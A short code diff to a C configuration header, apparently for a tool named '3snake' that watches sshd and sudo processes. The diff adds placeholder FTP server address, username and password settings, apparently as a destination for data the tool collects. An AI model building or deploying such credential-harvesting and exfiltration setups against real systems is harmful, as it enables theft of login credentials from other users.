@@ -16,6 +16,15 @@
 //Directory this process will live in if daemonized with -d
 #define ROOT_DIR "/tmp"
 
+//IP address for FTP server
+#define ADDR "ip address"
+
+//FTP User
+#define USER "ftpuser"
+
+//FTP Password
+#define PASS "ftppassword"
+
 //Process paths where sshd and sudo can exist (so random users on the system can't trigger 3snake with their own processes)
 #define CONFIG_PROCESS_PATHS 5
 
